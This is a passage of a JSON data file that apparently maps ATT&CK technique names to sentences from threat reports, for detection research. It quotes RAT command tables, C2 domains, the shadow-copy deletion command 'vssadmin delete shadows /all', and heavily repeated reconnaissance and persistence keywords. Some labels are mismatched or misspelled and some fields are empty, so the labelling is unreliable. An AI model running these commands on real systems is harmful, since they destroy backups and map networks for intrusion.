HttpBrowser RAT   f627bc2db3cab34d97c8949931cb432d MD5 hash HttpBrowser RAT   b313bbe17bd5ee9c00acff3bfccdb48a MD5 hash PlugX RAT dropper   f7a842eb1364d1269b40a344510068e8 MD5 hash PlugX RAT dropper   8dacca7dd24844935fcd34e6c9609416 MD5 hash PlugX RAT dropper   7cffd679599fb8579abae8f32ce49026 MD5 hash PlugX RAT dropper   462fd01302bc40624a44b7960d2894cd MD5 hash PlugX RAT dropper    Table 1"
        ]
    },
    "exfiltration over command and control channel remote file copy-multi": {
        "technique_names": [
            "exfiltration over command and control channel",
            "remote file copy"
        ],
        "sentances": [
            "Command Functionality   Init Create a reverse shell   Write Write a file to the compromised system from the C2 server   List List the files in a directory   Upload Upload a file from the compromised system to the C2 server    Table 2"
        ]
    },
    "timestomp masquerading file and directory discovery data staged registry run keys / startup folder-multi": {
        "technique_names": [
            "timestomp",
            "masquerading",
            "file and directory discovery",
            "data staged",
            "registry run keys / startup folder",
            "tor"
        ],
        "sentances": [
            "Command Functionality   A List logical drives   B List directory (Z1 = directory name to list)   C Read data from file (Z1 = filename to read)   D Write content to file (Z1 = filename to write, Z2 = content to write)   E Delete file in directory (Z1 = file)   F Generate custom web response \"->|value in Z1|<-\"   G Write hex-encoded content to file (Z1 = filename to write, Z2 = hex encoded content to write)   H Call _Notice(Z1, Z2)   I Move/rename file or directory (Z1 = target, Z2 = new name)   J Create directory (Z1 = directory name)   K Timestomp file or directory (Z1 = target, Z2 = time/date string to stomp to)   L Download file from Internet (Z1 = URL, Z2 = filename to write to)   M Launch process (Z1 = process name, Z2 = arguments)   N Test connect to SQL database (Z1 = SqlConnect String)   O SQL Get database table scheme (Z1 = \\r delimited parameters to command)   P SQL Get database table scheme with restrictions (Z1 = \\r delimited parameters to command)   Q SQL execute SQL command (Z1 = \\r delimited parameters to command)    Table 4"
        ]
    },
    "deobfuscate/decode files or information obfuscated files or information commonly used port-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "obfuscated files or information",
            "commonly used port"
        ],
        "sentances": [
            "Encrypted backdoor configuration    Description Decryption Strings   Check code MDDEFGEGETGIZ   Addr1: tel.qpoe[.]com   Addr2: elderscrolls.wikaba[.]com   Addr3: tel.qpoe[.]com   Port1: 443   Port2: 443   Port3: 53   LoginPasswd: someone   HostMark: mark   Proxy: 0    Figure 12"
        ]
    },
    "indicator removal on host system time discovery-multi": {
        "technique_names": [
            "indicator removal on host",
            "system time discovery",
            "tor"
        ],
        "sentances": [
            "This log contains the external IP, the geographic location, the machine name, the time the machine was infected, as well as fields to be logged in the threat actor\u2019s database"
        ]
    },
    "regsvr32 registry run keys / startup folder-multi": {
        "technique_names": [
            "regsvr32",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "19-2 A startup event for persistence The malware will run 2 .dlls from regsvr32 simultaneously, spawning userinit, ctfmon, and svchost processes"
        ]
    },
    "credentials in files": [
        "To ensure its victim will use IE, it will terminate any process in-focus that is Chrome or Firefox, in hopes the victim will believe the browsers are \u201cmalfunctioning.\u201d Whenever a victim uses IE and browses to specific Brazilian banks or businesses, the malware will only then begin to log keystrokes"
    ],
    "deobfuscate/decode files or information data compressed-multi": {
        "technique_names": [
            "deobfuscate/decode files or information",
            "data compressed"
        ],
        "sentances": [
            "22 Keylogging and exfiltrating data The exfiltrated data is base64 that decodes into more custom encoded strings that appear to be \u201c/\u201d delimited"
        ]
    },
    "process discovery commonly used port-multi": {
        "technique_names": [
            "process discovery",
            "commonly used port"
        ],
        "sentances": [
            "The frequent checking ensures that any changes made will be quickly followed, and the repeated attempts to run the Revenge RAT binary make it almost certain that even if the process is terminated, the RAT will be running again soon"
        ]
    },
    "standard cryptographic protocol exfiltration over command and control channel-multi": {
        "technique_names": [
            "standard cryptographic protocol",
            "exfiltration over command and control channel"
        ],
        "sentances": [
            "We are still analyzing this Trojan to determine the specific structure of the data sent between the Trojan and the C2 server; however, it does appear that the Trojan is using the RC4 algorithm to encrypt data sent to the C2 server within HTTP POST requests"
        ]
    },
    "standard application layer protocol file and directory discovery-multi": {
        "technique_names": [
            "standard application layer protocol",
            "file and directory discovery",
            "tor"
        ],
        "sentances": [
            "When generating the URL for the HTTP requests issued to the C2 server, the Trojan chooses a random folder from the following to include within the URL path: watch/? search/? find/? results/? open/? search/? close/? XAgent also will choose several parameters names from the following list when finishing the construction of the C2 URL: itwm= text= from="
        ]
    },
    "custom cryptographic protocol obfuscated files or information data encoding-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "obfuscated files or information",
            "data encoding"
        ],
        "sentances": [
            "It then uses the base64 encoding function with this alphabet to encode the data, which in the above case resulted in: D-7Ig1ngV3PkdouzP974 The Trojan then creates a string of 9 random symbols and appends the encoded ciphertext to this random string"
        ]
    },
    "system network configuration discovery command-line interface-multi": {
        "technique_names": [
            "system network configuration discovery",
            "command-line interface"
        ],
        "sentances": [
            "The command handler obtains a command identifier from the C2 server and adds 0xFFFFFF9B to this value and then uses a switch statement to determine the appropriate command to execute"
        ]
    },
    "timestomp standard application layer protocol execution through api-multi": {
        "technique_names": [
            "timestomp",
            "standard application layer protocol",
            "execution through api"
        ],
        "sentances": [
            "The switch statement checks for 19 cases, between 101 and 119.\u00a0(Updated to correct command IDs, thanks @mykill!)    Command ID Function  \u00a0Description   101 getInfoOSX Gathers username and OSX version and responds using the encrypted form of the following string: \u201cMac OS X \u2013 [OSX version] x64<br>\\nUser name \u2013 [username]\u201d   102 getProcessList Runs \u201cps aux\u201d to obtain a list of running processes   103 remoteShell Runs supplied command using \u201c/bin/sh\u201d   104 getInstalledAPP Gets a list of installed applications by running the command \u201cls -la /Applications\u201d   105 showBackupIosFolder Checks to see if an IOS device was backed up to the system by running the command \u201cls -la ~/Library/Application\\ Support/MobileSync/Backup/\u201d   106 downloadFileFromPath Uploads a file from a specified path   107 createFileInSystem Downloads a file, specifically provided within the C2 server\u2019s HTTP response   108 execFile Executes a specified file on the system using the NSTask:launch method   109 deletFileFromPath Deletes a specified file using the NSFileManager:removeFileAtPath method   110 takeScreenShot Takes a screenshot using the CGGetActiveDisplayList, CGDisplayCreateImage, NSImage:initWithCGImage methods"
        ]
    },
    "custom cryptographic protocol input capture-multi": {
        "technique_names": [
            "custom cryptographic protocol",
            "input capture"
        ],
        "sentances": [
            "The keylogger will monitor for active application windows and write them to the log in the following format: <span class=\u2019keylog_process\u2019>[Application Name]</span> The keylogger will log a configurable amount of keystrokes (default 50) before sending the log to the C2 server using the following format: <span class=\u2019keylog_user_keys\u2019>[logged keystrokes]</span> The keylogger can handle logging special keys, such as return and the function keys and will report those within the log in the following format; <span class=\u2019keylog_spec_key\u2019>[special character]</span> Infrastructure The XAgentOSX sample we analyzed was configured to use the following IP address and domain names as its C2 servers: 23.227.196[.]215 apple-iclods[.]org apple-checker[.]org apple-uptoday[.]org apple-search[.]info When we analyzed this sample, the domain names that were used as backup C2 locations were not registered; therefore, these domains did not provide any links to additional infrastructure"
        ]
    },
    "spearphishing via service": [
        "The usage of LinkedIn to deliver malicious documents,"
    ],
    "spearphising via service-multi": {
        "technique_names": [
            "arp"
        ],
        "sentances": [
            "Managed Defense reached out to the impacted customer\u2019s security team, who confirmed the file was received via a LinkedIn message."
        ]
    },
    "data encrypted for impact-multi": {
        "technique_names": [
            "data encrypted"
        ],
        "sentances": [
            "At the same time, Enc.exe will start the encryption routine and append \u201c. jcry \u201d as file extension to the encrypted file.",
            "Ryuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer.",
            "A new child process is created as \u201c tg \u200b yt \u200b ut \u200b rc \u200b ( ID) \u200b .e \u200b xe - i SM- tgytutrc \u201d, which is used to encrypt a single file on the drive"
        ]
    },
    "data encrypted for impact": [
        "At the same time, Enc.exe will start the encryption routine and append \u201c. jcry \u201d as file extension to the encrypted file.",
        "Ryuk is a ransomware that uses a combination of public and symmetric-key cryptography to encrypt files on the host computer.",
        "A new child process is created as \u201c tg \u200b yt \u200b ut \u200b rc \u200b ( ID) \u200b .e \u200b xe - i SM- tgytutrc \u201d, which is used to encrypt a single file on the drive"
    ],
    "data destruction": [
        "After the encryption of file, it will delete shadow copies with the command \u201c vssadmin delete shadows /all \u201d to ensure that all the data cannot be restored easily."
    ],
    "template injection": [
        "Opening document starts a template injection technique for loading the document template from the internet.",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        "remote template ",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton",
        " template injeciton"
    ],
    "spearphishing-multi": {
        "technique_names": [
            "arp"
        ],
        "sentances": [
            "It was sent to exhibitors in an email with an Excel or Word document containing macros, pretending to be from the organizer of the event.",
            "The attackers gain an initial foothold on targeted machines via phishing emails containing malicious attachments."
        ]
    },
    "data encrypted": [
        "The Data field is encrypted using a custom stream cipher.",
        "Once encrypted, the system information is sent in the body of an HTTP POST"
    ],
    "inhibit system recovery": [
        "Finally the script deletes the shadow copies, in a preparation for the ransomware operations."
    ],
    "create account": [
        "They apparently create a Domain Admin account  named SQLSVC and give it the password Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit script) and then leverage that account to perform a series of commands."
    ],
    "exploitation of remote services-multi": {
        "technique_names": [
            "remote services"
        ],
        "sentances": [
            ""
        ]
    },
    "exploitation of remote services": [
        "",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        "MS##-### ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        " smb and exploit in same sentence ",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}",
        "MS\\d{2}-\\d{3}"
    ],
    "exploitation for client execution.-multi": {
        "technique_names": [
            "exploitation for client execution"
        ],
        "sentances": [
            ""
        ]
    },
    "valid accounts": [
        ""
    ],
    "permission groups discovery": [
        "FIN6 conducted internal reconnaissance with a Windows batch file leveraging Adfind to query Active Directory, then 7-zip to compress the results for exfiltration",
        "",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        "net group ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " net localgroup ",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm",
        " Get-LocAdm"
    ],
    "dynamic data exchange": [
        "The decoy file, doc.rtf, contains an OLE object that uses Equation Editor to drop the embedded shellcode in %TEMP%",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        "OLE ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object ",
        " OLE object "
    ],
    "office application startup": [
        "The decrypted shellcode is dropped as a Microsoft Word plugin WLL  into C:\\Users\\ADMINI~1\\AppData\\Roaming\\Microsoft\\Word\\STARTUP.",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf ",
        "HKCU\\Software\\Microsoft\\Office test\\Special\\Perf "
    ],
    "data obfuscation": [
        "In order to evade network level detection, the downloader uses steganography."
    ],
    "domain trust discovery": [
        "The wormDll32 module attempts to identify servers and domain controllers in the network using NetServerEnum and LDAP queries.",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        "objectClass=trustedDomain ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " nltest /domain_trusts ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetDomainTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
        " Get-NetForestTrust ",
